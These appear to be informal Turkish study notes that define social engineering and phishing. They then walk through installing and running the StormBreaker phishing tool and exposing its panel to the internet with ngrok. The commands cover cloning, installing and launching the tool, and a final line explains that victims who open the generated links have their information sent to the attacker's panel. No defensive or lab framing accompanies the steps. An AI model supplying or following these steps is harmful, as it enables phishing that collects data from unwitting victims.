### Sosyal Mühendislik

- Sosyal mühendislik, bir hackerın teknik açıkları değil insanları kandırarak bilgi veya erişim elde etme yöntemidir.

Yani saldırgan:

- Sistem hacklemek yerine
- İnsan psikolojisini kullanarak şifre, kod veya gizli bilgi alır.

Basit Örnekler

- Sahte e-posta gönderip “şifrenizi yenileyin” diyerek kullanıcıdan şifre almak (phishing).
- Kendini IT çalışanı gibi tanıtıp çalışanlardan parola istemek.
- Sahte bir siteye yönlendirip kullanıcı bilgilerini çalmak.

**_ StormBreaker _**

- StormBreaker, bir kişinin cihazı hakkında bilgi toplamak veya kontrol etmek için kullanılan bir araçtır. Genelde Android telefonları veya bilgisayarları hedef almak için hazırlanmış phishing tabanlı saldırılarda görülür.
  Genelde şu şekilde çalışır:

* Saldırgan bir sahte link oluşturur
* Kurban linke tıklar
* Tarayıcı üzerinden bazı bilgiler toplanır
* Bilgiler saldırganın paneline gider

  > git clone https://github.com/ultrasecurity/Storm-Breaker // >cd /opt
  > cd Storm-Breaker
  > sudo bash install.sh //hata çıktı görünebilir.Çalışıyordur
  > sudo python3 -m pip install -r requirements.txt
  > sudo python3 st.py //çalışır
  - açılan stormbreaker ekranında > ngrok http 2525

**_ ngrok _**

- Sir, ngrok kısaca yerel bilgisayarında çalışan bir servisi internet üzerinden erişilebilir hale getiren bir araçtır.

En çok şu durumlarda kullanılır:

- Web uygulaması test etmek
- mobil uygulama backend testleri
- Webhook test etmek (Stripe, GitHub vb.)
- local projeyi müşteriye göstermek

* Senin bilgisayarın (localhost:3000)
  ↓
  ngrok
  ↓
  https://randomlink.ngrok.io
  ↓
  İnternette herkes erişebilir

* ngork üye ol
* download ngroak for linux
* ngrok config add-authotoken ... // cp
* ls //ngork'un olduğu klasöre gir
* ./ngrok config add-authotoken ...
* ./ngrok http 2525 // stormbreakerdaki localhost çalışır ordaki ip tarayıcıya cp
  -- açılan arayüzdeki linkleri kurbana açtırırsan arayüzde atılan linkle ilgili bilgiler çıkmaya başlar.
